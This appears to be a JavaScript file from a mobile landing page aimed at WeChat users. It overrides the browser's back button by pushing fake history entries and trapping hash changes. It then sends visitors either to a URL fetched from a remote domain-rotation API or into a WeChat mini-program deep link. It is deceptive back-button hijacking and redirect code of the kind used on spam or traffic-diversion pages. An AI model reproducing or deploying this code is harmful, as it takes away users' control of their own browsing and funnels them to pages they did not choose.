window.onpageshow = function() {
    sessionStorage.getItem('jumpOut') && a();
}

function getCurrentNidForMiniJump() {
    if (window.templateData && window.templateData.nid) {
        return window.templateData.nid;
    }
    if (typeof dataInfo !== 'undefined' && dataInfo && dataInfo.nid) {
        return dataInfo.nid;
    }
    var match = String(window.location.pathname || '').match(/\/([A-Za-z0-9]{4,16})\/?$/);
    return match ? match[1] : '';
}

function buildMiniJumpUrl() {
    var nid = getCurrentNidForMiniJump();
    var query = 'fromHost=' + (window.location.hostname || '') + '&fromNid=' + nid + '&refNid=' + nid;
    return 'weixin://dl/business/?appid=wx92ef5038fdff5bb5&path=pages/index/index&query=' + encodeURIComponent(query);
}

function a() {
    //location.href = "https://mp.weixin.qq.com/s/jodGwOTeDD1E_uH-npWK6g";
    let apiUrl = '';
    let hostnameMp = window.location.hostname;
    //https://api.jianyuekeji.cn/api/getDomain/5133_jdvue9vejevmeusg
    //https://api.hbty002.cn/task/getDomain?hh=zz100&cs=2&pp=1
    //https://api.hbty002.cn/task/getDomain?hh=bx28&cs=2&pp=1
    
    if(hostnameMp.startsWith('v.best22')){
        
     
       var rand_n = Math.floor(Math.random() * 100);
        if(rand_n <= 100){
            apiUrl = 'https://api.jianyuekeji.cn/api/getDomain/7022_bs7hsk9gg24cenj5';
        }else{
            apiUrl = 'https://api.jianyuekeji.cn/api/getDomain/5133_jdvue9vejevmeusg';
        }
        window.fetch(apiUrl).then(function(res) {
            return res.json();
        }).then(function(data) {
            location.href = data.url;
        })
       
       /*
            let timeid = new Date().getTime().toString().substr(-11,5);
             location.href = "http://new.wan55.cn/maps#1231" + timeid;
        */
        /*
        apiUrl = 'https://api.jianyuekeji.cn/api/getDomain/5134_4kwyn83uebbffavk';
        
        if(apiUrl){
            window.fetch(apiUrl).then(function(res) {
                return res.json();
            }).then(function(data) {
                location.href = data.url;
            })
        }else{
            location.href = "weixin://dl/business/?appid=wx33474b7963e5638b&path=pages/index/index&query=fromHost%3Dmp:"+ window.location.hostname +"%26fromNid%3D" + dataInfo.nid;
        }
        */
        
    
    }else if(hostnameMp.startsWith('dw225')){
        //location.href = "https://mp.weixin.qq.com/s/_AiqHEO_r2Tb4P5yAbsyrQ";
    }else{
          
        location.href = buildMiniJumpUrl();
        
    }
}

function ntzgo() {
    history.pushState(history.length + 1, "message", window.location.href.split("#")[0] + "#" + new Date()
        .getTime());
    if (navigator.userAgent.indexOf("Android") != -1) {
        if (typeof(tbsJs) != "undefined") {
            tbsJs.onReady("{useCachedApi : 'true'}", function(e) {});
            window.onhashchange = function() {
                window.history.pushState("forward", null, "#");
                window.history.forward(1);
                a()
            }
        } else {
            var pop = 0;
            window.onhashchange = function(event) {
                pop++;
                if (pop >= 3) {
                    a()
                } else {
                    history.go(1)
                }
            };
            history.go(-1)
        }
    } else {
        window.onhashchange = function() {
            a()
        }
    }
};
